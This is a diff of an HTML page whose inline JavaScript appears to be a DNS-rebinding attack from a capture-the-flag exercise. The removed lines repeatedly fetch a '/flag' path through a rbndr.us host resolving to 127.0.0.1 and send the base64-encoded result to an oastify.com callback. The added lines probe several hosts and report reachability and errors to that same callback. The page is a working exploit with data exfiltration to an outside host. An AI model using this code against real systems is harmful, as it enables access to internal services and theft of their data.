@@ -2,23 +2,25 @@
 <html>
 <body>
 <script>
-const target = 'acd918ee.7f000001.rbndr.us';
+const targets = [
+    'acd918ee.7f000001.rbndr.us',
+    'google.com',
+    'example.com'
+];
 
-// Very aggressive - many rapid attempts
-for (let i = 1; i <= 200; i++) {
+targets.forEach((target, i) => {
     setTimeout(() => {
-        fetch(`http://${target}:80/flag`)
-            .then(r => r.text())
-            .then(flag => {
+        fetch(`http://${target}/`)
+            .then(() => {
                 const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?SUCCESS_${i}=` + btoa(flag);
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?reachable_${i}=` + btoa(target);
             })
             .catch(err => {
                 const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?attempt_${i}=` + btoa(err.toString().substring(0, 50));
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?unreachable_${i}=` + btoa(target + ': ' + err.toString());
             });
-    }, i * 500); // Every 500ms for 100 seconds total
-}
+    }, i * 2000);
+});
 </script>
 </body>
 </html>
